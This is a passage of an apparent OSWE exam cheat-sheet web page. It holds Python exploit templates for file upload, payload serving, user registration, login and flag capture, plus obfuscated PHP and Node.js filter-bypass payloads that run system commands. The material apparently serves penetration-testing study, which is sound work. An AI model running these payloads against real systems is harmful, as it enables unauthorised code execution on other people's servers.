        "image": (filename, pwny, mime_type)
    }

    r = requests.post(url, data=data, files=files, cookies=cookies, proxies=proxies, allow_redirects=False)
    # Adjust success check based on application response
    if 'success' in r.text.lower():  # Example check
        print(f"[+] Filename {filename} uploaded successfully!")
        return filename
    else:
        print("[-] File is not uploaded.")
        return None</code></pre>
        </div>
      </div>
      <div class="content-section group-python" id="section-HTTP-File-Server-Template">
        <h3 id="HTTP-File-Server-Template">HTTP File Server Template</h3>
        <div class="panel">
          <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import os
import socket
import mimetypes

def start_web_server(host='0.0.0.0', port=8000, directory='.', js_payload=None):
    os.chdir(directory)
    
    class MyHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            try:
                file_path = os.path.join(directory, self.path.lstrip("/"))
                if os.path.exists(file_path) and os.path.isfile(file_path):
                    self.send_response(200)
                    mime_type, _ = mimetypes.guess_type(file_path)
                    if mime_type is None:
                        mime_type = 'application/octet-stream'
                    self.send_header("Content-type", mime_type)
                    self.end_headers()
                    with open(file_path, "rb") as f:
                        self.wfile.write(f.read())
                elif self.path.endswith('/payload.js') and js_payload:
                    self.send_response(200)
                    self.send_header("Content-Type", "application/javascript")
                    self.send_header("Content-Length", str(len(js_payload)))
                    self.end_headers()
                    self.wfile.write(js_payload.encode())
                else:
                    self.send_response(404)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    self.wfile.write(b"File not found")
            except Exception as e:
                self.send_response(500)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(f"Server error: {str(e)}".encode())

    httpd = HTTPServer((host, port), MyHandler)
    print(f"Serving at {host}:{port}")
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd</code></pre>
        </div>
      </div>
      <h3>Template: Get Attacker IP (e.g., tun0)</h3>
        <pre><code class="language-python">import netifaces

def get_attacker_ip(interface='tun0'):
    try:
        addresses = netifaces.ifaddresses(interface)
        ip_info = addresses.get(netifaces.AF_INET)
        if ip_info:
            return ip_info[0]['addr']
    except ValueError:
        return None</code></pre>
        <h3>Template: Register User</h3>
        <pre><code class="language-python">import requests
import random
import string

def register(url, headers=None, data_template=None, proxies=None):
    username = ''.join(random.choices(string.ascii_letters, k=4))
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    if data_template is None:
        data_template = {}
    data = data_template.copy()
    data['username'] = username
    data['password'] = password
    data['email'] = f"{username}@example.com"
    r = requests.post(url, headers=headers, data=data, proxies=proxies)
    if r.status_code in [200, 201, 302]:
        print(f"[+] Registered {username}:{password}")
        return username, password
    else:
        print("[-] Registration failed.")
        return None, None</code></pre>
        <h3>Template: Login User</h3>
        <pre><code class="language-python">import requests
import re

def login(url, username, password, headers=None, data_template=None, proxies=None):
    if data_template is None:
        data_template = {}
    data = data_template.copy()
    data['username'] = username
    data['password'] = password
    r = requests.post(url, headers=headers, data=data, allow_redirects=False, proxies=proxies)
    if r.status_code in [200, 302]:
        print("[+] Login successful.")
        # Extract session cookie
        set_cookie = r.headers.get('Set-Cookie', '')
        pattern = r'PHPSESSID=([^;]+)'  # Adjust for cookie name
        match = re.search(pattern, set_cookie)
        if match:
            session_id = match.group(1).strip()
            print(f"[+] Session ID: {session_id}")
            return session_id
    print("[-] Login failed.")
    return None</code></pre>
        <h3>Template: Get Local Flag</h3>
        <pre><code class="language-python">import requests
import re

def get_local_flag(url, cookies, success_pattern, proxies=None):
    r = requests.get(url, cookies=cookies, proxies=proxies)
    matches = re.findall(success_pattern, r.text, re.DOTALL)
    if matches:
        flag = matches[0].strip()
        print(f"[+] Local flag: {flag}")
        return flag
    else:
        print("[-] No flag found.")
        return None</code></pre>
        <h3>Template: Register via WebSocket</h3>
        <pre><code class="language-python">import asyncio
import websockets
import random
import string

async def register_ws(ws_url, data_template):
    username = ''.join(random.choices(string.ascii_letters, k=4))
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    data = f'42["register",{data_template.format(username=username, password=password)}]'
    uri = f"ws://{ws_url}/socket.io/?EIO=3&transport=websocket"
    async with websockets.connect(uri) as ws:
        await ws.send(data)
        response = await ws.recv()
        if 'success' in response:
            print(f"[+] Registered {username}:{password} via WS.")
            return username, password</code></pre>
        <h3>Template: Login via WebSocket</h3>
        <pre><code class="language-python">import asyncio
import websockets

async def login_ws(ws_url, username, password, data_template):
    data = f'42["login",{data_template.format(username=username, password=password)}]'
    uri = f"ws://{ws_url}/socket.io/?EIO=3&transport=websocket"
    async with websockets.connect(uri) as ws:
        await ws.send(data)
        response = await ws.recv()
        if 'token' in response:
            token = response.split('"token":"')[1].split('"')[0]  # Adjust parsing
            print(f"[+] Token: {token}")
            return token</code></pre>
      </div>

      <span id="Bypass-Filters"></span>
      <div class="content-section group-bypass" id="section-Bypass-Filters-title">
        <h2>Bypass Filters</h2>
      </div>
      <div class="content-section group-bypass" id="section-Bypass-PHP-Eval-Filtering">
        <h3 id="Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</h3>
        <div class="panel">
          <pre><code class="language-php">get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
(new ReflectionFunction(hex2bin("65786563")))->invoke('hostname');</code></pre>
        </div>
      </div>
      <div class="content-section group-bypass" id="section-Bypass-Javascript-Injection-Filters">
        <h3 id="Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</h3>
        <div class="panel">
          <pre><code class="language-javascript">(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //" 
(function(){module.constructor._load(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync('ping -c 2');})();//"</code></pre>
        </div>
      </div>

      <div class="content-section" id="section-YSOSerial">
        <h2 id="YSOSerial">YSOSerial</h2>
        <h3>.NET Version</h3>
        <p><a href="https://github.com/pwntester/ysoserial.net">https://github.com/pwntester/ysoserial.net</a></p>

        <h3>JAVA Version</h3>
        <p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
      </div>

      <div class="content-section" id="section-Regex-Cheatsheet">
        <h2 id="Regex-Cheatsheet">Regex Cheatsheet</h2>
        <p>Match a START and END delimeter in <code>r.text</code>:</p>
        <div class="panel">
          <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
match = re.search(f'{re.escape("START DELIMETER")}(.*?){re.escape("END DELIMETER")}', r.text, re.DOTALL)
print(match[1].strip())</code></pre>
        </div>

        <p>Extract a cookie value from response headers:</p>
        <div class="panel">
          <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
set_cookie = r.headers.get('Set-Cookie', '')
match = re.search(r'JSESSIONID=([A-Za-z0-9]+);', set_cookie)
print(match.group(1))</code></pre>
        </div>
      </div>

      <div class="content-section" id="section-Report-Recommendations">
        <h2 id="Report-Recommendations">Report Recommendations</h2>
        <p>For code indentation:</p>
        <ul>
          <li>Copy the code straight from VS Code into a 1x1 table in Word</li>
        </ul>
      </div>

      <div class="content-section" id="section-Additional-Resources">
        <h2 id="Additional-Resources">Additional Resources</h2>
        <p>Further practice & references:</p>
        <ul>
          <li><a href="https://github.com/yeswehack/vulnerable-code-snippets">https://github.com/yeswehack/vulnerable-code-snippets</a></li>
          <li><a href="https://github.com/bmdyy/order">https://github.com/bmdyy/order</a></li>
          <li><a href="https://github.com/bmdyy/chat.js">https://github.com/bmdyy/chat.js</a></li>
          <li><a href="https://github.com/bmdyy/tudo">https://github.com/bmdyy/tudo</a></li>
          <li><a href="https://github.com/bmdyy/testr">https://github.com/bmdyy/testr</a></li>
          <li><a href="https://github.com/TROUBLE-1/White-box-pentesting">https://github.com/TROUBLE-1/White-box-pentesting</a></li>
          <li><a href="https://www.vulnhub.com/entry/securecode-1,651">https://www.vulnhub.com/entry/securecode-1,651</a></li>
          <li><a href="https://github.com/takito1812/web-hacking-playground">https://github.com/takito1812/web-hacking-playground</a></li>
          <li><a href="https://pentesterlab.com/badges/codereview">https://pentesterlab.com/badges/codereview (paid)</a></li>
          <li><a href="https://github.com/b1d0ws/OSWE">https://github.com/b1d0ws/OSWE</a></li>
          <li><a href="https://regexlearn.com/learn/">https://regexlearn.com/learn/</a></li>
          <li><a href="https://www.nomachine.com/">https://www.nomachine.com/</a></li>
        </ul>
      </div>

      <p class="muted">— end of document —</p>
    </div>
  </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
  document.querySelectorAll('.content-section').forEach(sec => sec.style.display = 'none');
  const firstSection = document.querySelector('.content-section');
  if (firstSection) firstSection.style.display = 'block';

  document.querySelectorAll('.oswe-toc a').forEach(link => {
    link.addEventListener('click', function(e) {
      e.preventDefault();
      const targetId = this.getAttribute('href');
      const targetElement = document.querySelector(targetId);
      if (targetElement) {
        if (this.classList.contains('main-group')) {
          const groupClass = targetId.slice(1).toLowerCase().replace(/-/g, '-');
          document.querySelectorAll('.content-section').forEach(sec => sec.style.display = 'none');
          document.querySelectorAll(`.group-${groupClass}`).forEach(sec => sec.style.display = 'block');
          if (targetElement) targetElement.scrollIntoView({ behavior: 'smooth' });
        } else {
          const section = document.querySelector(`#section-${targetId.slice(1)}`);
          if (section) {
            document.querySelectorAll('.content-section').forEach(sec => sec.style.display = 'none');
            section.style.display = 'block';
            setTimeout(() => {
              targetElement.scrollIntoView({ behavior: 'smooth' });
            }, 100);
          }
        }
      }
    });
  });
});
</script>
